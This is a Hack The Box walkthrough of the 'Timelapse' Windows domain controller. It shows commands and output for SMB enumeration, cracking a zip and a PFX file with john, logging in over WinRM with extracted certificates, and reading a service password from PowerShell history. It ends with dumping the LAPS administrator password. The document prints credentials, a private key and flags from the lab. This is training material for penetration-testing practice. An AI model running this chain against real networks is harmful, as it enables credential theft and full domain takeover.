@@ -1,0 +1,675 @@
+Timelapse - Hack The Box - Windows Openssl Certificates
+IPPSEC Video Link: https://www.youtube.com/watch?v=gWTGGfl9ajQ
+
+NMAP results
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/nmap]
+└─$ sudo nmap -sVC 10.10.11.152 -oA timelapse
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 21:59 EDT
+Nmap scan report for 10.10.11.152
+Host is up (0.13s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-08-21 10:12:50Z)
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl?
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 8h13m02s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-08-21T10:13:05
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 84.61 seconds
+============================================================================================
+
+No webserver. Windows Domain Controller. We also get a hostname
+We now query smb with crackmap exec
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse]
+└─$ crackmapexec smb 10.10.11.152                                          
+SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+============================================================================================
+
+We can append the domain name to our hostnames file.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse]
+└─$ crackmapexec smb 10.10.11.152 -u '' -p '' --users --shares
+SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.152    445    DC01             [-] timelapse.htb\: STATUS_ACCESS_DENIED 
+SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+SMB         10.10.11.152    445    DC01             [-] Error enumerating domain users using dc ip 10.10.11.152: NTLM needs domain\username and a password
+SMB         10.10.11.152    445    DC01             [*] Trying with SAMRPC protocol
+============================================================================================
+
+We don't get enough output so we can try a different tool such as smbclient
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/nmap]
+└─$ smbclient -L //10.10.11.152/
+Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shares          Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+============================================================================================
+
+We get a list of shares
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/nmap]
+└─$ smbclient //10.10.11.152/Shares 
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1244849 blocks available
+============================================================================================
+
+We can now try and access the shares interactively
+Commands and Text:
+============================================================================================
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/timelapse/nmap]
+└─$ smbclient //10.10.11.152/Shares 
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+                6367231 blocks of size 4096. 1244849 blocks available
+smb: \> cd Dev
+lsmb: \Dev\> ls
+  .                                   D        0  Mon Oct 25 15:40:06 2021
+  ..                                  D        0  Mon Oct 25 15:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
+
+                6367231 blocks of size 4096. 1250808 blocks available
+smb: \Dev\> get winrm_backup.zip 
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+============================================================================================
+
+We find a backup and download it to our local computer. We do the same with the other
+available directory.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/nmap]
+└─$ smbclient //10.10.11.152/Shares
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> cd helpdesk
+smb: \helpdesk\> ls
+  .                                   D        0  Mon Oct 25 11:48:42 2021
+  ..                                  D        0  Mon Oct 25 11:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
+
+                6367231 blocks of size 4096. 1235769 blocks available
+smb: \helpdesk\> get LAPS_OperationsGuide.docx
+getting file \helpdesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (31.7 KiloBytes/sec) (average 31.7 KiloBytes/sec)
+smb: \helpdesk\> get LAPS_Datasheet.docx
+getting file \helpdesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (31.6 KiloBytes/sec) (average 31.6 KiloBytes/sec)
+============================================================================================
+
+We can now grep for usernames or password by running grep and looking for those strings.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ exiftool LAPS* | grep -i user                                          
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ exiftool LAPS* | grep -i name
+File Name                       : LAPS_Datasheet.docx
+Zip File Name                   : [Content_Types].xml
+MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Name: General
+File Name                       : LAPS_OperationsGuide.docx
+Zip File Name                   : [Content_Types].xml
+MSIP_Label_f42aa342-8706-4288-bd11-ebb85995028c_Name: Internal
+File Name                       : LAPS_TechnicalSpecification.docx
+Zip File Name                   : [Content_Types].xml
+File Name                       : LAPS.x64.msi
+============================================================================================
+
+Not much really so we move on. Lets unzip the zip.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ unzip winrm_backup.zip     
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+============================================================================================
+
+We need to enter a password, we can run password guesser on the zip file and see if we can
+unzip it that way. We generate password hash from the zip file and crack it to obtain the
+credentials
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ john winrm_backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2022-08-20 23:31) 1.666g/s 5782Kp/s 5782Kc/s 5782KC/s surkerior..suppamas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+============================================================================================
+
+Entering the cracked password "supremelegacy"
+Commands and Text:
+============================================================================================
+──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ unzip winrm_backup.zip                                         
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx   
+============================================================================================
+
+We get pfx file which is a group of certificates, but we need another password
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -info
+Enter Import Password:
+..
+..
+..
+
+MAC: sha1, Iteration 2000
+MAC length: 20, salt length: 20
+Mac verify error: invalid password?
+
+============================================================================================
+
+We have to something similar as we did with zip file with this pfx file 
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ pfx2john legacyy_dev_auth.pfx 
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ john legacyy_dev_auth.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:21 3.96% (ETA: 23:46:08) 0g/s 31099p/s 31099c/s 31099C/s haakon..guartz
+0g 0:00:00:22 4.15% (ETA: 23:46:08) 0g/s 31064p/s 31064c/s 31064C/s bulmershe..bubbles122
+0g 0:00:00:23 4.32% (ETA: 23:46:09) 0g/s 30924p/s 30924c/s 30924C/s BOXERDOG..Amylee
+0g 0:00:00:48 8.76% (ETA: 23:46:25) 0g/s 29331p/s 29331c/s 29331C/s pascas..parnnut
+0g 0:00:01:00 10.94% (ETA: 23:46:26) 0g/s 28958p/s 28958c/s 28958C/s hmoobxyooj..hizashi
+0g 0:00:01:32 16.18% (ETA: 23:46:46) 0g/s 27600p/s 27600c/s 27600C/s z94j01m04..z77166
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:01:59 DONE (2022-08-20 23:39) 0.008338g/s 26942p/s 26942c/s 26942C/s thuglife06..thug211
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+============================================================================================
+
+Inputting the password multiple times provides us with multiple certs
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -info
+Enter Import Password:
+MAC: sha1, Iteration 2000
+MAC length: 20, salt length: 20
+PKCS7 Data
+Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000
+Bag Attributes
+    Microsoft Local Key set: <No Values>
+    localKeyID: 01 00 00 00 
+    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
+    Microsoft CSP Name: Microsoft Software Key Storage Provider
+Key Attributes
+    X509v3 Key Usage: 90 
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIuC4D+Y67eXACAggA
+MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECIrYJZbL0Gk8BIIEyGtXqk2gSRYG
+H/1aBAHbdy42CSVqnxqToehIXfeTQkNVN3ZcFBOixlWoDBzmIH1Y2qdRCuHers8Y
+Q7UAPbOJBSQ6cRgcAmZe4yX6CNY9tHxnS+6pi2QsMnA9dJXCpPpgszbe77pk9WHL
+YM+fFBHFh6fzC6G31GOCkdq0V/IpNSg2G+wIqP0xvYnOWUfld/Af2CPrGg6y2GgP
+hrPKT3djINtQNRAOFKVrnOi+/QZ4dHA+4Rpxnjhic91heD1fcXmhoomCOxYx6Cav
+IMWfWHwtDpZEgXlA0k3FoRucX9x64j1NoYEi4kSPbYrQSkCdIbyGOM2xPkX6311M
+UdLZoyepMHztwO+Q8SQhD5acCf+CoaZlKREZsABwyqpk1VhBwwWkE5QNbtGJiWDY
+P0RVLBsgFXiQRx/fP/j45GGmq3DFzOgbR+6vfWK01uFDCRv92Z/j1EH/2F6Jr1CK
+UlaHdp/ADbvMANPPJWHBv/xUyCMV7YqqyvUbRoA+da8hZK4KBU7QTMdTBOoujTH1
+q1ROG3KpoWGgaQOOrMhjbtr9vSXIUitI3fnUJKfH6JRhbFUBuGV9KWOcycMU4qpa
+VoFsm+aYqlGtqJ5TlCL0cI/chTd7rQmN1988uvUAkPSY+xMfhZAWez2dufNNYqwm
+dtBeMp8v/Pv0QWbd+v9gNEEvq+yYFmFV90uySlhard3bEquFgC+O9CSLkopIlBVn
+r90y3GHq/mgzsmWgWcqFmplL26WtzoHP0cop45aIyMPBMkSFORRoCCJh7Tf6fHt1
+EiQE5U3rGltj1zdN7uzJA6+0ad9dlY8RWTeKrBVk3SlNik16e4YWtGEK9SCgS2Z7
+o5LBFDrjD/7sqrxDoKfO7k49I+3UaQKCROEASq3CnzkKp+nVa7sy7oG7MILd59+c
+04x+3VIYedVAq1xvEQBgpPBb+NuiIbPQFgs0RpSwCf0OpN/g6SXvRLcet9uPei2n
+vds8nbYQ+MfRDwYWDF6f8eM0bUFJqiDJ3jTVmfIWRTeoP+u2+rjS0sqI936wESlU
+TtkGwKrHT66TpeBToKCkv2G+g1RnfFuRZNHJKGWZlfmMF/8oJmBNB5PR9q1Ie9QF
+k4YUTmramWmislugXa9r7enH31xasLw22KZ6E0NpwNbqqSog7Nv1DCK0CNtkCDDz
+WUVq1ii2ECX6uyV2Q++08S+izbdmJNyknTlaLibzaoQ5R1KMVj8C5FY5iTm81VF8
+GbxlTYpXro9JDCLT4/snrjXF/TGeVQGgrB5rkEvVBLr+8RSrdeetC44GDVKlH+u5
+MYj81jKzL+cKFAntFhqRnAdDrOzRn0p4TaTpAMNUlg901NTXcnUo1+hEJI27YCeY
+K8FgMz4/IVit8wiAE5L9ERoDht5TfsUVoOWgGgomcIOV2SXkCq7BUePAYKIVZRp8
+4PurT7Pt/+bxSZcwwYCA2IdgpXKTUdwy7f3Pe6tfwtgxuOd/9gMBsdmwcyAAuBXy
+HiRW3vulMNDo22PFLYtMYcsE8cpjIat07ERIObIBGRZb6FvJ2BpoVsXluijvbwho
+cWYIJ4NyShrFE7sO/1WnLI4FLLj0CchjZQoa0hzTLy0nbzqGI0sq3U737f4vord0
+l28LBr3nyerQAGEs3MKOcw==
+-----END ENCRYPTED PRIVATE KEY-----
+PKCS7 Data
+Certificate bag
+Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN = Legacyy
+
+issuer=CN = Legacyy
+
+-----BEGIN CERTIFICATE-----
+MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
+MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
+MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
+0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
+YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
+7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
+MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
+yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
+MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
+DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
+rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
+m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
+3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
+fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
+hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
+nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
+-----END CERTIFICATE-----
+                                            
+============================================================================================
+
+We can extract the certificates manually to avoid error with whitespaces.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert    
+Enter Import Password:
+
+============================================================================================
+
+We should be able to use evilwinrm to auth with keys. We check for open ports with nmap
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ sudo nmap -p 5985,5986 10.10.11.152
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 23:46 EDT
+Nmap scan report for timelapse.htb (10.10.11.152)
+Host is up (0.12s latency).
+
+PORT     STATE    SERVICE
+5985/tcp filtered wsman
+5986/tcp open     wsmans
+
+Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds
+============================================================================================
+
+We can now use evilwinrm with the certs.
+Commands and Text:
+============================================================================================
+──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ evil-winrm -i 10.10.11.152 -S -k key.pem -c key.cert
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+============================================================================================
+
+Nothing in the docs directory.
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
+e25ee6d50dc0b3059ebe5b212d91eec8
+============================================================================================
+
+Once in we can run winpeas on the box and see if we can get anywhere with getting admin privs
+Instead lets focus on one speicific file, psreadline file located in appdata directory
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline> ls
+
+
+    Directory: C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline> cat ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+============================================================================================
+
+We are able to find a password we can attempt to login with it.
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.152    445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ crackmapexec winrm 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+
+SMB         10.10.11.152    5986   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:timelapse.htb)
+HTTP        10.10.11.152    5986   DC01             [*] https://10.10.11.152:5986/wsman
+WINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV "HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7fc4c5d5c790>, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))"
+============================================================================================
+
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/downloads]
+└─$ evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+============================================================================================
+
+Since we are running an active directory, we can run bloodhound and sharphound.
+We get a copy of sharphound
+Commands and Text:
+============================================================================================
+https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpHound.exe
+============================================================================================
+
+
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload SharpHound.exe
+Info: Uploading SharpHound.exe to C:\Users\svc_deploy\Documents\SharpHound.exe
+
+                                                             
+Data: 771412 bytes of 771412 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls
+
+
+    Directory: C:\Users\svc_deploy\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/21/2022   5:19 AM         578560 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> .\SharpHound.exe
+2022-08-21T05:20:02.3676010-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-08-21T05:20:02.8519826-07:00|INFORMATION|Initializing SharpHound at 5:20 AM on 8/21/2022
+2022-08-21T05:20:04.0551049-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-08-21T05:20:04.7582317-07:00|INFORMATION|Beginning LDAP search for timelapse.htb
+2022-08-21T05:20:04.8207289-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-08-21T05:20:04.8207289-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-08-21T05:20:35.6019953-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 26 MB RAM
+2022-08-21T05:20:52.5951508-07:00|INFORMATION|Consumers finished, closing output channel
+2022-08-21T05:20:52.6420241-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2022-08-21T05:20:53.7982752-07:00|INFORMATION|Status: 112 objects finished (+112 2.285714)/s -- Using 33 MB RAM
+2022-08-21T05:20:53.7982752-07:00|INFORMATION|Enumeration finished in 00:00:49.0435820
+2022-08-21T05:20:53.8764005-07:00|INFORMATION|SharpHound Enumeration Completed at 5:20 AM on 8/21/2022! Happy Graphing!
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls
+
+
+    Directory: C:\Users\svc_deploy\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/21/2022   5:20 AM          12282 20220821052052_BloodHound.zip
+-a----        8/21/2022   5:20 AM          10603 NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin
+-a----        8/21/2022   5:19 AM         578560 SharpHound.exe
+
+============================================================================================
+
+We uploaded sharphound and got output which we can then download to our local filesystem.
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> download 20220821052052_BloodHound.zip
+Info: Downloading 20220821052052_BloodHound.zip to ./20220821052052_BloodHound.zip
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> download NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin
+Info: Downloading NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin to ./NzcwYWNhMTEtODlmNS00OTNiLWEyNjAtZDQ2YjczY2QzMDk2.bin   
+============================================================================================
+
+We can also try some manual enumeration.
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+============================================================================================
+
+LAPS - Local Administrator Password Solution, randomizes passwords on all machines, stored 
+in active directory, only members of laps reader can read the password.
+
+We issue the following command to get data on the computer
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-adcomputer -Filter 'ObjectClass -eq "computer"' -Property *
+============================================================================================
+
+We can now grab the output and look for any type of password that the laps group member has
+access to.
+Commands and Text:
+============================================================================================
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-adcomputer -Filter 'ObjectClass -eq "computer"' -Property * > password-data.txt
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> download password-data.txt
+Info: Downloading password-data.txt to ./password-data.txt
+============================================================================================
+
+We get issues grepping for the file given the format being used so we can convert it to linux
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/www]
+└─$ dos2unix password-data.txt 
+dos2unix: converting UTF-16LE file password-data.txt to UTF-8 Unix format...
+
+┌──(kali㉿kali)-[~/htb/windows/timelapse/www]
+└─$ grep -i "pwd" password-data.txt
+badPwdCount                          : 0
+ms-Mcs-AdmPwd                        : #7#T0]7y-24,9Xq7&s2DX0Z,
+ms-Mcs-AdmPwdExpirationTime          : 133059823085346703
+pwdLastSet                           : 133055502566596705
+badPwdCount                          : 0
+pwdLastSet                           : 132794902913288614
+badPwdCount                          : 0
+pwdLastSet                           : 132794902971507056
+badPwdCount                          : 0
+pwdLastSet                           : 132794903036875725
+============================================================================================
+
+Looks like we found an admin password for rid 500
+Commands and Text:
+============================================================================================
+'#7#T0]7y-24,9Xq7&s2DX0Z,'
+============================================================================================
+
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/www]
+└─$ evil-winrm -i 10.10.11.152 -u 'Administrator' -p '#7#T0]7y-24,9Xq7&s2DX0Z,' -S
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                     
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                       
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
+
+..
+..
+..
+
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users> gci trx/desktop
+
+
+    Directory: C:\Users\trx\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/21/2022   3:11 AM             34 root.txt
+
+============================================================================================
+
+We could also pull the master password by pulling from ldap with impacket
+Commands and Text:
+============================================================================================
+https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py
+============================================================================================
+
+Commands and Text:
+============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/timelapse/www]
+└─$ python3 laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+LAPS Dumper - Running at 08-21-2022 00:48:42
+DC01 #7#T0]7y-24,9Xq7&s2DX0Z,
+============================================================================================
+
+This can be done because the user is part of the laps reader group which has access to the
+data.
+
+Commands and Text:
+============================================================================================
+============================================================================================
+
+Commands and Text:
+============================================================================================
+============================================================================================
+
+Commands and Text:
+============================================================================================
+============================================================================================
+
+Commands and Text:
+============================================================================================
+============================================================================================
+
